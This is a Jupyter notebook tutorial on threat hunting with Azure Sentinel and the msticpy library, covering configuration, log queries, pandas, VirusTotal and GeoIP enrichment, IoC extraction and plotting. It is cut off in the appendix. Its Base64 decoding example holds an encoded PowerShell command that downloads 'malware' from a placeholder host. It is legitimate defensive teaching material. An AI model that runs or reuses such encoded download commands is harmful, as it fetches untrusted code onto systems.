{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "# Getting Started with Azure ML Notebooks and Azure Sentinel\n",
        "**Notebook Version:** 1.0<br>\n",
        " **Python Version:** Python 3.6 (including Python 3.6 - AzureML)<br>\n",
        " **Required Packages**: <br>\n",
        " **Platforms Supported**:\n",
        " - Azure Notebooks Free Compute\n",
        " - Azure Notebooks DSVM\n",
        " - OS Independent\n",
        "\n",
        "**Data Sources Required**:\n",
        " - Log Analytics - SiginLogs (Optional)\n",
        " - VirusTotal\n",
        " - MaxMind\n",
        " \n",
        " \n",
        "This notebook takes you through the basics needed to get started with Azure Notebooks and Azure Sentinel, and how to perform the basic actions of data acquisition, data enrichment, data analysis, and data visualization. These actions are the building blocks of threat hunting with notebooks and are useful to understand before running more complex notebooks. This notebook only lightly covers each topic but includes 'learn more' sections to provide you with the resource to deep dive into each of these topics. \n",
        "\n",
        "This notebook assumes that you are running this in an Azure Notebooks environment, however it will work in other Jupyter environments.\n",
        "\n",
        "**Note:**\n",
        "This notebooks uses SigninLogs from your Azure Sentinel Workspace. If you are not yet collecting SigninLogs configure this connector in the Azure Sentinel portal before running this notebook.\n",
        "This notebook also uses the VirusTotal API for data enrichment, for this you will require an API key which can be obtained by signing up for a free [VirusTotal community account](https://www.virustotal.com/gui/join-us)\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "---\n",
        "## Setting up the environment\n",
        "Code cells behave in the same way your code would in other environments, so you need to remember about common coding practices such as variable initialization and library imports. \n",
        "Before we execute more complex code we need to make sure the required packages are installed and libraries imported. At the top of many of the Azure Sentinel notebooks you will see large cells that will check kernel versions and then install and import all the libraries we are going to be using in the notebook, make sure you run this before running other cells in the notebook.\n",
        "If you are running notebooks locally or via dedicated compute in Azure Notebooks library installs will persist but this is not the case with Azure Notebooks free tier, so you will need to install each time you run. Even if running in a static environment imports are required for each run so make sure you run this cell regardless."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "---\n",
        "## Configuration\n",
        "Once we have set up our Jupyter environment with the libraries that we'll use in the notebook, we need to make sure we have some configuration in place. Some of the notebook components need addtional configuration to connect to external services (e.g. API keys to retrieve Threat Intelligence data). This includes configuration for connection to our Azure Sentinel workspace, as well as some threat intelligence providers we will use later.\n",
        "The easiest way to handle the configuration for these services is to store them in a msticpyconfig file (`msticpyconfig.yaml`). More details on msticpyconfig can be found here: https://msticpy.readthedocs.io/en/latest/getting_started/msticpyconfig.html\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "The cell below will setup a msticpyconfig.yaml file. If your config file does not contain details under Azure Sentinel > Workspaces, or TIProviders the following cells will populate these for you.<br>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "%pip uninstall -y enum34\n",
        "\n",
        "%pip uninstall -y enum"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "pip install msticpy==1.4.5"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "from pathlib import Path\n",
        "import os\n",
        "import sys\n",
        "import warnings\n",
        "from IPython.display import display, HTML, Markdown\n",
        "\n",
        "REQ_PYTHON_VER=\"3.6\"\n",
        "REQ_MSTICPY_VER=\"1.4.5\"\n",
        "\n",
        "display(HTML(\"Checking upgrade to latest msticpy version\"))\n",
        "%pip install --upgrade --quiet msticpy[azuresentinel]>=$REQ_MSTICPY_VER\n",
        "\n",
        "# intialize msticpy\n",
        "from msticpy.nbtools import nbinit\n",
        "nbinit.init_notebook(\n",
        "    namespace=globals(),\n",
        "    extra_imports=[\"ipwhois, IPWhois\", \"urllib.request, urlretrieve\", \"yaml\"]\n",
        ")\n",
        "\n",
        "pd.set_option(\"display.html.table_schema\", False)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "!pip install -U PyYAML\n",
        "\n",
        "import yaml\n",
        "import urllib.request\n",
        "\n",
        "def print_config():\n",
        "    with open('msticpyconfig.yaml') as f:\n",
        "        data = yaml.load(f)\n",
        "        print(yaml.dump(data))\n",
        "try:\n",
        "    print_config()\n",
        "except FileNotFoundError:\n",
        "    print(\"No msticpyconfig.yaml was found in your current directory.\")\n",
        "    print(\"We are downloading a template file for you.\")\n",
        "    urllib.request.urlretrieve(\"https://raw.githubusercontent.com/Azure/Azure-Sentinel-Notebooks/master/msticpyconfig.yaml\", \"msticpyconfig.yaml\")\n",
        "    print_config()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "If you do not have an msticpyconfig file we can populate one for you. Before you do this you will need a few things.\n",
        "\n",
        "The first is the Workspace ID and Tenant ID of the Azure Sentinel Workspace you wish to connect to.\n",
        "\n",
        " - You can get the workspace ID by opening Azure Sentinel in the [Azure Portal](https://portal.azure.com) and selecting Settings > Workspace Settings. Your Workspace ID is displayed near the top of this page.\n",
        "\n",
        "- You can get your tenant ID (also referred to organization or directory ID) via [Azure Active Directory](https://docs.microsoft.com/en-us/onedrive/find-your-office-365-tenant-id)\n",
        "\n",
        "We are going to use [VirusTotal](https://www.virustotal.com) to enrich our Azure Sentinel data. For this you will need a VirusTotal API key, one of these can be obtained for free (as a personnal key) via the [VirusTotal](https://developers.virustotal.com/v3.0/reference#getting-started) website.\n",
        "We are using VirusTotal for this notebook but we also support a range of other threat intelligence providers: https://msticpy.readthedocs.io/en/latest/data_acquisition/TIProviders.html\n",
        "<br><br>\n",
        "In addition we are going to plot IP address locations on a map, in order to do this we are going to use [MaxMind](https://www.maxmind.com) to geolocate IP addresses which requires an API key. You can sign up for a free account and API key at https://www.maxmind.com/en/geolite2/signup. \n",
        "<br><br>\n",
        "Once you have these required items run the cell below and you will prompted to enter these elements:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "from msticpy.config import MpConfigEdit\n",
        "import os\n",
        "\n",
        "mp_conf = \"msticpyconfig.yaml\"\n",
        "\n",
        "# check if MSTICPYCONFIG is already an env variable\n",
        "mp_env = os.environ.get(\"MSTICPYCONFIG\")\n",
        "mp_conf = mp_env if mp_env and Path(mp_env).is_file() else mp_conf\n",
        "\n",
        "if not Path(mp_conf).is_file():\n",
        "    print(\n",
        "        \"No msticpyconfig.yaml was found!\",\n",
        "        \"Please check that there is a config.json file in your workspace folder.\",\n",
        "        \"If this is not there, go back to the Azure Sentinel portal and launch\",\n",
        "        \"this notebook from there.\",\n",
        "        sep=\"\\n\"\n",
        "    )\n",
        "else:\n",
        "    mpedit = MpConfigEdit(mp_conf)\n",
        "    mpedit.set_tab(\"AzureSentinel\")\n",
        "    display(mpedit)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Adding Threat Intel and GeoIP provider settings\n",
        "\n",
        "We are going to use [VirusTotal](https://www.virustotal.com) (VT) as an example of a popular threat intelligence source.\n",
        "To use VirusTotal threat intel lookups you will need a VirusTotal account and API key.\n",
        "\n",
        "You can sign up for a free account at the\n",
        "[VirusTotal getting started page](https://developers.virustotal.com/v3.0/reference#getting-started) website.\n",
        "\n",
        "If you are already a VirusTotal user, you can, of course, use your existing key.\n",
        "\n",
        "<p style=\"border: solid; padding: 5pt; color: black; background-color: Khaki\">\n",
        "<b>Warning</b> If you are using a VT enterprise key we do not recommend storing this\n",
        "in the msticpyconfig.yaml file.<br>\n",
        "MSTICPy supports storage of secrets in\n",
        "Azure Key Vault. You can read more about this\n",
        "<a href=https://msticpy.readthedocs.io/en/latest/getting_started/msticpyconfig.html#specifying-secrets-as-key-vault-secrets >in the MSTICPY docs</a><br>\n",
        "For the moment, you can sign up for a free acount, until you can take the time to\n",
        "set up Key Vault storage.\n",
        "</p>\n",
        "\n",
        "\n",
        "As well as VirusTotal, we also support a range\n",
        "of other threat intelligence providers: https://msticpy.readthedocs.io/en/latest/data_acquisition/TIProviders.html\n",
        "<br><br>\n",
        "\n",
        "To add the VirusTotal details, run the following cell.\n",
        "\n",
        "1. Select \"VirusTotal\" from the **Add prov** drop down\n",
        "2. Click the **Add** button\n",
        "3. In the left-side Details panel select **Text** as the Storage option.\n",
        "4. Paste the API key in the **Value** text box.\n",
        "5. Click the **Update** button to confirm your changes.\n",
        "\n",
        "Your changes are not yet saved to your configuration file. To\n",
        "do this, click on the **Save Settings** button at the bottom of the dialog.\n",
        "\n",
        "If you are unclear about what anything in the configuration editor means, use the **Help** drop-down. This\n",
        "has instructions and links to more detailed documentation.\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "Our notebooks commonly use IP geo-location information. \n",
        "In order to enable this we are going to set up [MaxMind GeoLite2](https://www.maxmind.com)\n",
        "to provide geolocation lookup services for IP addresses.\n",
        "\n",
        "GeoLite2 uses a downloaded database which requires an account key to download.\n",
        "You can sign up for a free account and a license key at \n",
        "[The Maxmind signup page - https://www.maxmind.com/en/geolite2/signup](https://www.maxmind.com/en/geolite2/signup).\n",
        "<br>\n",
        "\n",
        "<details>\n",
        "    <summary>Using IPStack as an alernative to GeoLite2...</summary>\n",
        "    <p>\n",
        "    For more details see the\n",
        "    <a href=https://msticpy.readthedocs.io/en/latest/data_acquisition/GeoIPLookups.html >\n",
        "    MSTICPy GeoIP Providers documentation</a>\n",
        "    </p>\n",
        "</details>\n",
        "<br>\n",
        "\n",
        "Once, you have an account, run the following cell to add the Maxmind GeopIP Lite details to your configuration.\n",
        "\n",
        "The procedure is similar to the one we used for VirusTotal:\n",
        "\n",
        "1. Select the \"GeoIPLite\" provider from the **Add prov** drop-down\n",
        "2. Click **Add**\n",
        "3. Select **Text** Storage and paste the license (API/Auth) key into the text box\n",
        "4. Click **Update**\n",
        "5. Click **Save Settings** to write your settings to your configuration.\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "We can now validate our configuration is correct."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "from msticpy.common.pkg_config import refresh_config, validate_config\n",
        "refresh_config()\n",
        "validate_config()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "> **Note** you may see warnings for missing providers when running this cell.\n",
        "> This is not an issue as we will not be using all providers in this notebook\n",
        "> so long as you get thie message \"No errors found.\" you are OK to proceed.\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "---\n",
        "## Getting Data\n",
        "Now that we have configured the details necessary to connect to Azure Sentinel we can go ahead and get some data. We will do this with `QueryProvider()` from MSTICpy. \n",
        "You can use the `QueryProvider` class to connect to different data sources such as MDATP, the Security Graph API, and the one we will use here, Azure Sentinel. \n",
        "\n",
        "### Learn more:\n",
        " - More details on configuring and using QueryProviders can be found in the [MSTICpy Documentation](https://msticpy.readthedocs.io/en/latest/data_acquisition/DataProviders.html#instantiating-a-query-provider).\n",
        "<br><br>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "For now, we are going to set up a QueryProvider for Azure Sentinel, pass it the details for our workspace that we just stored in the msticpyconfig file, and connect. \n",
        "\n",
        "The connection process will ask us to authenticate to our Azure Sentinel workspace via [device authorization](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) with our Azure credentials. \n",
        "\n",
        "You can do this by clicking the device login code button that appears as the output of the next cell, or by navigating to https://microsoft.com/devicelogin and manually entering the code. \n",
        "\n",
        "Note that this authentication persists with the kernel you are using with the notebook, so if you restart the kernel you will need to re-authenticate.\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "# Initalize a QueryProvider for Azure Sentinel\n",
        "qry_prov = QueryProvider(\"LogAnalytics\")\n",
        "\n",
        "# Get the Azure Sentinel workspace details from msticpyconfig\n",
        "try:\n",
        "    ws_config = WorkspaceConfig()\n",
        "    md(\"Workspace details collected from config file\")\n",
        "except:\n",
        "    raise Exception(\"No workspace settings are configured, please run the cells above to configure these.\")\n",
        "    \n",
        "# Connect to Azure Sentinel with our QueryProvider and config details\n",
        "# ws_config.code_connect_str is a feature of MSTICpy that creates the required connection string from details in our msticpyconfig\n",
        "qry_prov.connect(connection_str=ws_config.code_connect_str)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "Now that we have connected we can query Azure Sentinel for data, but before we do that we need to understand what data is avalaible to query. The QueryProvider object provides a way to get a list of tables as well as tables and table columns:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "# Get list of tables in our Workspace\n",
        "display(qry_prov.schema_tables [:10]) # We are outputting only the first 10 tables for brevity\n",
        "# Get list of tables and thier columns\n",
        "qry_prov.schema['SigninLogs'] # We are only displaying the columns for SigninLogs for brevity"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "MSTICpy includes a number of built in queries that you can run.<br>\n",
        "You can list available queries with .list_queries() and get specific details about a query by calling it with \"?\" as a parameter"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "# Get a list of avaliable queries\n",
        "qry_prov.list_queries()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "# Get details about a query\n",
        "qry_prov.Azure.list_all_signins_geo(\"?\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "# Query browser\n",
        "qry_prov.browse_queries()"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "You can then run the query by calling it with the required parameters:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "from datetime import datetime, timedelta\n",
        "# set our query end time as now\n",
        "end = datetime.now()\n",
        "# set our query start time as 1 hour ago\n",
        "start = end - timedelta(hours=1)\n",
        "# run query with specified start and end times\n",
        "logons_df = qry_prov.Azure.list_all_signins_geo(start=start, end=end)\n",
        "# display first 5 rows of any results\n",
        "logons_df.head() # If you have no data you will just see the column headings displayed"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "Another way to run queries is to pass a string format of a KQL query to the query provider, this will run the query against the workspace connected to above, and will return the data in a [Pandas DataFrame](https://pandas.pydata.org/). We will look at working with Pandas in a bit more detail later."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "# Define our query\n",
        "test_query = \"\"\"\n",
        "SigninLogs\n",
        "| where TimeGenerated > ago(7d)\n",
        "| take 10\n",
        "\"\"\"\n",
        "\n",
        "#reset just in case.\n",
        "qry_prov = QueryProvider(\"LogAnalytics\")\n",
        "qry_prov.connect(connection_str=ws_config.code_connect_str)\n",
        "\n",
        "# Pass that query to our QueryProvider\n",
        "test_df = qry_prov.exec_query(test_query)\n",
        "\n",
        "# Check that we have some data\n",
        "if isinstance(test_df, pd.DataFrame) and not test_df.empty:\n",
        "    # .head() returns the first 5 rows of our results DataFrame\n",
        "    display(test_df.head())\n",
        "# If where is no data load some sample data to use instead\n",
        "else:\n",
        "    md(\"You don't appear to have any SigninLogs - we will load sample data for you to use.\")\n",
        "    if not Path(\"nbdemo/data/aad_logons.pkl\").exists():\n",
        "        Path(\"nbdemo/data/\").mkdir(parents=True, exist_ok=True)\n",
        "        urlretrieve('https://#WORKSPACE_NAME#.blob.core.windows.net/logs/aad_logon.pkl', 'nbdemo/data/aad_logons.pkl')\n",
        "        urlretrieve('https://#WORKSPACE_NAME#.blob.core.windows.net/logs/queries.yaml', 'nbdemo/data/queries.yaml')\n",
        "    qry_prov = QueryProvider(\"LocalData\", data_paths=[\"nbdemo/data/\"], query_paths=[\"nbdemo/data/\"])\n",
        "    logons_df = qry_prov.Azure.list_all_signins_geo()\n",
        "    display(logons_df.head())"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Customizable queries\n",
        "\n",
        "Most built-in queries support the \"add_query_items\" parameter.\n",
        "You can use this to append additional filters or other operations to the built-in queries.\n",
        "\n",
        "Azure Sentinel queries use the Kusto Query Language (KQL).\n",
        "\n",
        "<div style=border: solid; padding: 5pt\"><b>Note:</b>\n",
        "If this query returns too many or too few results you can change the \"28\"\n",
        "in the query below to a smaller or larger number of days.\n",
        "</div>\n",
        "<br>\n",
        "\n",
        "<details>\n",
        "    <summary>Learn more about KQL query syntax...</summary>\n",
        "    <p>\n",
        "    <a href=https://aka.ms/kql >Kusto Query Language reference</a><br>\n",
        "    </p>\n",
        "</details>\n",
        "<br>\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "from datetime import datetime, timedelta\n",
        "\n",
        "#Reset back to log analytics source\n",
        "qry_prov = QueryProvider(\"LogAnalytics\")\n",
        "qry_prov.connect(connection_str=ws_config.code_connect_str)\n",
        "\n",
        "qry_prov.SecurityAlert.list_alerts(\n",
        "    start=datetime.utcnow() - timedelta(28),\n",
        "    end=datetime.utcnow(),\n",
        "    add_query_items=\"| summarize NumAlerts=count() by AlertName\"\n",
        ")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Learn more:\n",
        " - You can learn more about the MSTICpy pre-defined queries in the [MSTICpy Documentation](https://msticpy.readthedocs.io/en/latest/data_acquisition/DataProviders.html#running-an-pre-defined-query)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "---\n",
        "## Pandas\n",
        "Our query results are returned in the form of a Pandas DataFrame. DataFrames are a core component of the Azure Sentinel notebooks and of MSTICpy and is used for both input and output formats.\n",
        "Pandas DataFrames are incredibly versitile data structures with a lot of useful features, we will cover a small number of them here and we recommend that you check out the Learn more section to learn more about Pandas features.\n",
        "<br>\n",
        "<br>\n",
        "### Displaying a DataFrame:\n",
        "The first thing we want to do is display our DataFrame. You can either just run it or explicity display it by calling `display(df)`."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "# For this section we are going to create a DataFrame from data we have saved in a csv file\n",
        "df = pd.read_csv(\"https://#WORKSPACE_NAME#.blob.core.windows.net/logs/host_logins.csv\", index_col=[0] )\n",
        "# Display our DataFrame\n",
        "df  # or display(df)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "> **Note** if the dataframe variable (`df` in the example above) is the last statement in a \n",
        "> code cell, Jupyter will automatically display it without using the `display()` function. \n",
        "> However, if you want to display a DataFrame in the middle of \n",
        "> other code in a cell you must use the `display()` function.\n",
        "\n",
        "You may not want to display the whole DataFrame and instead display only a selection of items. There are numerous ways to do this and the cell below shows some of the most widely used functions."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "md(\"Display the first 2 rows using head(): \", \"bold\")\n",
        "display(df.head(2))  # we don't need to call display here but just for illustration"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "md(\"Display the 3rd row using iloc[]: \", \"bold\")\n",
        "df.iloc[3]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "md(\"Show the column names in the DataFrame \", \"bold\")\n",
        "df.columns"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "md(\"Display just the TimeGenerated and TenantId columnns: \", \"bold\")\n",
        "df[[\"TimeGenerated\", \"TenantId\"]]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "md(\"Display only rows where TargetUserName value is 'MSTICAdmin': \", \"bold\")\n",
        "df[df['TargetUserName']==\"MSTICAdmin\"]"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "md(\"Display rows where TargetUserName is either MSTICAdmin or adm1nistratror:\", \"bold\")\n",
        "display(df[df['TargetUserName'].isin(['adm1nistrator', 'MSTICAdmin'])])"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "Our DataFrame call also be extended to add new columns with additional data if reqired:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "df[\"NewCol\"] = \"Look at my new data!\"\n",
        "display(df[[\"TenantId\",\"Account\", \"TimeGenerated\",\"IpAddress\",\"NewCol\"]].head(2))"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "---\n",
        "## Enriching data\n",
        "\n",
        "Now that we have seen how to query for data, and do some basic manipulation we can look at enriching this data with additional data sources. For this we are going to use an external threat intelligence provider to give us some more details about an IP address we have in our dataset using the [MSTICpy TIProvider](\"https://msticpy.readthedocs.io/en/latest/data_acquisition/TIProviders.html\") feature."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "---\n",
        "\n",
        "# Testing Threat Intelligence (VirusTotal) and IP location (GeoLite2) configuration\n",
        "\n",
        "Threat intelligence and IP location are two common enrichments that you might apply to queried data.\n",
        "\n",
        "Let's test the VirusTotal provider with a known bad IP Address.\n",
        "\n",
        "<details>\n",
        "    <summary>Learn more...</summary>\n",
        "    <p>\n",
        "    </p>\n",
        "    <ul>\n",
        "        <li>More details are shown in the <i>A Tour of Cybersec notebook features</i> notebook</li>\n",
        "        <li><a href=https://msticpy.readthedocs.io/en/latest/data_acquisition/TIProviders.html >Threat Intel Lookups in MSTICPy</a></li>\n",
        "    </ul>\n",
        "</details>\n",
        "<br>\n",
        "\n",
        "\n",
        "## Threat intel lookup"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "# Create our TI provider\n",
        "ti = TILookup()\n",
        "\n",
        "# Lookup an IP Address\n",
        "ti_resp = ti.lookup_ioc(\"85.214.149.236\", providers=[\"VirusTotal\"])\n",
        "\n",
        "ti_df = ti.result_to_df(ti_resp)\n",
        "ti.browse_results(ti_df, severities=\"all\")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "## Geo-IP Lookup\n",
        "\n",
        "<div style=\"border: solid; padding: 5pt\"><b>Note:</b>\n",
        "You may see the GeoLite driver downloading its database the first time you run this.\n",
        "</div>\n",
        "<br>\n",
        "<details>\n",
        "    <summary>Learn more about MSTICPy GeoIP providers...</summary>\n",
        "    <p>\n",
        "    <a href=https://msticpy.readthedocs.io/en/latest/data_acquisition/GeoIPLookups.html >MSTICPy GeoIP Providers</a>\n",
        "    </p>\n",
        "</details>\n",
        "<br>\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {},
      "outputs": [],
      "source": [
        "geo_ip = GeoLiteLookup()\n",
        "raw_res, ip_entity = geo_ip.lookup_ip(\"85.214.149.236\")\n",
        "display(ip_entity[0])"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "from datetime import datetime, timedelta\n",
        "# Check if we have logon data already and if not get some\n",
        "if not isinstance(logons_df, pd.DataFrame) or logons_df.empty:\n",
        "    # set our query end time as now\n",
        "    end = datetime.now()\n",
        "    # set our query start time as 1 hour ago\n",
        "    start = end - timedelta(days=1)\n",
        "    # run query with specified start and end times\n",
        "    logons_df = qry_prov.Azure.list_all_signins_geo(start=start, end=end)\n",
        "    \n",
        "# Create our TI provider\n",
        "ti = TILookup()\n",
        "# Get the first logon IP address from our dataset\n",
        "ip = df.iloc[1]['IpAddress']\n",
        "# Look up the IP in VirusTotal\n",
        "ti_resp = ti.lookup_ioc(ip, providers=[\"VirusTotal\"])\n",
        "\n",
        "# Format our results as a DataFrame\n",
        "ti_resp = ti.result_to_df(ti_resp)\n",
        "display(ti_resp)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "Using the [Pandas apply()](https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.apply.html) feature we can get results for all the IP addresses in our data set and add the lookup severity score as a new column in our DataFrame for easier reference."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "# Take the IP address in each row, look it up against TI and return the severity score\n",
        "def lookup_res(row):\n",
        "    ip = row['IpAddress']\n",
        "    resp = ti.lookup_ioc(ip, providers=[\"VirusTotal\"])\n",
        "    resp = ti.result_to_df(resp)\n",
        "    return resp[\"Severity\"].iloc[0]\n",
        "\n",
        "# Take the first 3 rows of data and copy they into a new DataFrame\n",
        "enrich_logons_df = df.iloc[:3].copy()\n",
        "# Create a new column called TIRisk and populate that with the TI severity score of the IP Address in that row\n",
        "enrich_logons_df['TIRisk'] = enrich_logons_df.apply(lookup_res, axis=1)\n",
        "# Display a subset of columns from our DataFrame\n",
        "display(enrich_logons_df[[\"TimeGenerated\", \"TargetUserName\", \"IpAddress\", \"TIRisk\"]])"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "### Learn more:\n",
        "MSTICpy includes further threat intelligence capabilities as well as other data enrichment options. More details on these can be found in the [documentation](https://msticpy.readthedocs.io/en/latest/DataEnrichment.html)."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "---\n",
        "## Analyzing data\n",
        "With the data we have collected we may wish to perform some analysis on it in order to better understand it. MSTICpy includes a number of features to help with this, and there are a vast array of other data analysis capabilities available via Python ranging from simple processes to complex ML models. We will start here by keeping it simple and look at how we can decode some Base64 encoded command line strings we have in order to allow us to understand their content."
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "from msticpy.sectools import base64unpack as b64\n",
        "# Take our encoded Powershell Command\n",
        "b64_cmd = \"powershell.exe -encodedCommand SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9jb250b3NvLmNvbS9tYWx3YXJlIC1PdXRGaWxlIEM6XG1hbHdhcmUuZXhl\"\n",
        "# Unpack the Base64 encoded elements\n",
        "unpack_txt = b64.unpack(input_string=b64_cmd)\n",
        "# Display our results and transform for easier reading\n",
        "unpack_txt[1].T"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "We can also use MSTICpy to extract Indicators of Compromise (IoCs) from a dataset, this makes it easy to extract and match on a set of IoCs within our data. In the example below we take a US Cybersecurity & Infrastructure Security Agency (CISA) report and extract all domains listed in the report:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "import requests\n",
        "# Set up our IoCExtract oject\n",
        "ioc_extractor = iocextract.IoCExtract()\n",
        "# Download our threat report\n",
        "data = requests.get(\"https://www.us-cert.gov/sites/default/files/publications/AA20-099A_WHITE.stix.xml\")\n",
        "# Extract domains listed in our report\n",
        "iocs = ioc_extractor.extract(data.text, ioc_types=\"dns\")['dns']\n",
        "# Display the first 5 iocs found in our report\n",
        "list(iocs)[:5]"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "---\n",
        "## Visualizing data\n",
        "Visualizing data can provide an excellent way to analyse data, identify patterns and anomalies. Python has a wide range of data visualization capabilities each of which have thier own benefits and drawbacks. We will look at some basic capabilities as well as the in-build visualizations in MSTICpy.\n",
        "<br><br><br>\n",
        "**Basic Graphs**<br>\n",
        "Pandas and Matplotlib provide the easiest and simplest way to produce simple plots of data:"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "vis_q = \"\"\"\n",
        "SigninLogs\n",
        "| where TimeGenerated > ago(7d)\n",
        "| sample 5\"\"\"\n",
        "\n",
        "# Try and query for data but if using sample data load that instead\n",
        "try:\n",
        "    vis_data = qry_prov.exec_query(vis_q)\n",
        "except FileNotFoundError:\n",
        "    vis_data = logons_df\n",
        "\n",
        "# Check we have some data in our results and if not use previously used dataset\n",
        "if not isinstance(vis_data, pd.DataFrame) or vis_data.empty:\n",
        "    vis_data = logons_df\n",
        "\n",
        "# Plot up to the first 5 IP addresses\n",
        "vis_data.head()[\"IPAddress\"].value_counts().plot.bar(\n",
        "    title=\"IP prevelence\", legend=False\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "trusted": true
      },
      "outputs": [],
      "source": [
        "pie_df = vis_data.copy()\n",
        " # If we have lots of data just plot the first 5 rows\n",
        "pie_df.head()['IPAddress'].value_counts().plot.pie(legend=True)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {},
      "source": [
        "---\n",
        "## Conclusion\n",
        "This notebook has showed you the basics of using notebooks and Azure Sentinel for security investigaitons. There are many more things possible using notebooks and it is stronly encouraged to read the material we have referenced in the learn more sections in this notebook. You can also explore the other Azure Sentinel notebooks in order to take advantage of the pre-built hunting logic, and understand other analysis techniques that are possible. </br>\n",
        "### Appendix:\n",
        " - [Jupyter Notebooks: An Introduction](https://realpython.com/jupyter-notebook-introduction/)\n",
